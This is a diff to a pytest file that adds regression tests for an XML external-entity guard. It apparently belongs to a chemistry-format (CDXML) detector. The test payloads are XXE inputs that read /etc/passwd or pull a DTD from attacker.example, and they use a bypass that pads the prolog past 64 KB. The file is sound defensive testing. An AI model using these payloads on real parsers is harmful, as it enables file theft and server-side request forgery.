@@ -331,10 +331,10 @@ def test_public_id_rejected() -> None:
 
 
 # ---------------------------------------------------------------------------
-# Bounded head scan — a malicious payload padding garbage into the scan
-# window cannot bypass detection because DOCTYPE MUST appear before the
-# root element. We verify by placing the DOCTYPE late in a padded prolog
-# but still within the 64 KB scan window.
+# Prolog walk — the guard scans the whole prolog (skipping comments / PIs),
+# not a fixed head window. A DOCTYPE/ENTITY must appear before the root
+# element, so padding the prolog (even past the old 64 KB window) cannot push
+# a malicious declaration out of scope.
 # ---------------------------------------------------------------------------
 
 
@@ -347,6 +347,74 @@ def test_doctype_deep_in_prolog_still_caught() -> None:
         + b" -->\n"
         + b'<!DOCTYPE CDXML [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
         + b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_external_doctype_beyond_64kb_prolog_window_caught() -> None:
+    """Regression: a >64 KB comment in the prolog used to push the DOCTYPE
+    past the fixed 64 KB scan window, so the guard accepted it and the bytes
+    reached the entity-resolving Java SAX parser (XXE/SSRF). The prolog walk
+    skips the comment and still inspects the late DOCTYPE."""
+    big_comment = b"<!-- " + (b"x" * 70_000) + b" -->"
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        + big_comment
+        + b'\n<!DOCTYPE CDXML SYSTEM "http://attacker.example/evil.dtd">\n'
+        + b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_entity_subset_beyond_64kb_prolog_window_caught() -> None:
+    """Same >64 KB-padding bypass, but via an internal-subset external general
+    entity (the file-read / SSRF primitive) instead of an external DOCTYPE."""
+    big_comment = b"<!-- " + (b"x" * 70_000) + b" -->"
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        + big_comment
+        + b'\n<!DOCTYPE CDXML [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        + b"<CDXML>&xxe;</CDXML>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_large_comment_then_benign_cdxml_accepted() -> None:
+    """A legitimate file with a >64 KB prolog comment and no DOCTYPE must NOT
+    be rejected — the walk skips the comment and finds the root element."""
+    payload = (
+        b'<?xml version="1.0"?>\n<!-- '
+        + (b"x" * 70_000)
+        + b" -->\n<CDXML><page><fragment>C</fragment></page></CDXML>"
+    )
+    reject_xml_external_entities(payload)
+    assert detect_format(payload) == "cdxml"
+
+
+def test_decoy_doctype_inside_comment_accepted() -> None:
+    """A DOCTYPE that only appears inside a comment is ignored by the SAX
+    parser, so the guard must skip it (no false positive) — and, combined
+    with the tests above, must still catch a real one elsewhere."""
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!-- <!DOCTYPE evil SYSTEM "http://attacker.example/evil.dtd"> -->\n'
+        b"<CDXML/>"
+    )
+    reject_xml_external_entities(payload)
+    assert detect_format(payload) == "cdxml"
+
+
+def test_bom_prefixed_external_doctype_rejected() -> None:
+    """A UTF-8 BOM before the prolog must not let a malicious DOCTYPE slip
+    past the walk (the BOM is skipped, not treated as leading junk)."""
+    payload = (
+        b"\xef\xbb\xbf"
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example/evil.dtd">\n'
+        b"<CDXML/>"
     )
     with pytest.raises(FormatDetectionError):
         reject_xml_external_entities(payload)
@@ -365,6 +433,7 @@ def test_guard_performance_bounded() -> None:
     t0 = time.perf_counter()
     reject_xml_external_entities(big)
     elapsed = time.perf_counter() - t0
-    # Slack bound — the guard should complete in under 50 ms even on a
-    # slow runner because the scan window is capped at 64 KB.
+    # Slack bound — the guard should complete in well under 50 ms even on a
+    # slow runner: the prolog walk stops at the root element after the XML
+    # declaration, so it never scans the 50 MB body.
     assert elapsed < 0.2, f"xml_guard took {elapsed * 1000:.1f} ms"
